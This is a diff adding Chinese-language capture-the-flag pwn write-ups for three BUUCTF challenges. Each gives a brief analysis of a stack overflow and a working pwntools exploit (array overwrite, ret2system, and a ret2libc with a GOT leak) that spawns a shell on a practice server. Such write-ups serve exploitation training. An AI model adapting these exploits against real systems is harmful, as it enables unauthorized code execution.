@@ -115,4 +115,91 @@ p.sendline(payload)
 p.sendline(str(0x10101010))
 p.interactive()
 ```
-最终得到flag
+最终得到flag  
+# ciscn_2019_n_8
+打开之后查main函数逻辑，然后你就会发现原来是一道水题- -，只要保证var数组第14位为0x11即可getshell，直接什么都不看编写poc梭哈
+```python
+from pwn import *
+
+p = remote("node4.buuoj.cn", 27097)
+
+#addr=0x0804C044
+payload=p32(0x11)*14
+p.sendline(payload)
+p.interactive()
+```
+梭哈成功✌
+# jarvisoj_level2
+IDA分析，`vulnerable_function`中有关于buf的read函数，且buf距离`ebp`长度为0x88，而read指定长度为0x100，再经过checksec查看，确认存在栈溢出漏洞。  
+查看字符串发现程序内已经包含了`/bin/sh`字符串且具有system函数，因此溢出思路为填充buf跳转到system函数，然后传入字符串`/bin/sh`作为参数即可getshell，编写poc如下
+```python
+from pwn import *
+
+p = remote("node4.buuoj.cn", 28037)
+
+binsh=0x0804A024
+system=0x8048320
+payload=b'a'*(0x88+4)+p32(system)+b'a'*4+p32(binsh)
+p.sendline(payload)
+p.interactive()
+```
+成功打通，cat flag
+# [OGeek2019]babyrop
+初期逻辑和前面一道题比较像，buf给一个随机数，然后拿用户输入与buf进行比较，显然这里没有利用空间。
+![main](https://image.0error.net/img/202220220611171440.png) 
+![804871F](https://image.0error.net/img/202220220611171133.png) 
+在sub_804871F函数里面很明显看到有`strlen(buf)`，这里有一个利用点，即strlen遇到`\x00`时直接截断，所以我们第一位直接截断即可绕过此部分，然后发现buf是一个7位数饿数组，但是在函数中有`read(0, buf, 0x20u)`，经计算，v5就相当于buf的第8位，所以v5在这里可以被我们指定。  
+![](https://image.0error.net/img/202220220611171355.png)
+而另一个函数sub_80487D0中a1就是main函数中传入的v5，buf的地址为[ebp-E7],如果v5为127，则会执行第一条代码，C8<E7,不能覆盖返回地址，v5需要尽可能的大，才能覆盖到返回地址。  
+根据上述思路，进行exp编写，这里一开始是想在绕过之后利用read/write泄露地址然后通过LibcSearcher找到libc版本号的，但是发现不是很成功...通过泄露的地址未能找到正确的libc，结果回头一看题目里面已经给出libc了- -既然如此那就直接用了。真可谓众里寻他千百度，得来全不费工夫，最后把LibcSearcher的部分注释了，~~也算是一种复习吧~~
+```python
+from pwn import *
+from LibcSearcher import *
+
+p = remote("node4.buuoj.cn", 28820)
+elf=ELF('./pwn1')
+libc=ELF('./libc-2.23.so')
+
+system_libc=libc.symbols['system']
+binsh_libc=next(libc.search(b'/bin/sh'))
+write_plt=elf.plt['write']
+write_got=elf.got['write']
+write_libc=libc.symbols['write']
+read_got=elf.got['read']
+read_plt=elf.plt['read']
+
+main_addr=0x8048825
+
+#payload1-截断strlen
+payload1=b'\x00'+b'\xff'*7
+p.sendline(payload1)
+p.recvuntil("Correct\n")
+
+#pay;pad2 - 泄露read的got地址
+payload=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)
+#                        ret1          ret2
+payload+=p32(1)+p32(write_got)+p32(4)
+#write     par1     par2        par3
+#write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数
+p.sendline(payload)
+
+write_addr=u32(p.recv(4))
+print('[+]write_addr: ', hex(write_addr))#得到了write在内存中的位置 可以用题目提供的函数共享库算出system在内存中的位置
+
+# libc=LibcSearcher('read', read_addr)
+# libc_base=read_addr-libc.dump('read')
+# system_addr=libc_base+libc.dump('system')
+# binsh_addr=libc_base+libc.dump('str_bin_sh')
+libc_base=write_addr-write_libc
+system_addr=system_libc+libc_base
+binsh_addr=binsh_libc+libc_base
+
+p.sendline(payload1)
+p.recvuntil("Correct\n")
+
+payload=b'a'*(0xe7+4)
+payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)#第二次直接把返回地址改为addr地址
+p.sendline(payload)
+
+p.interactive()
+```
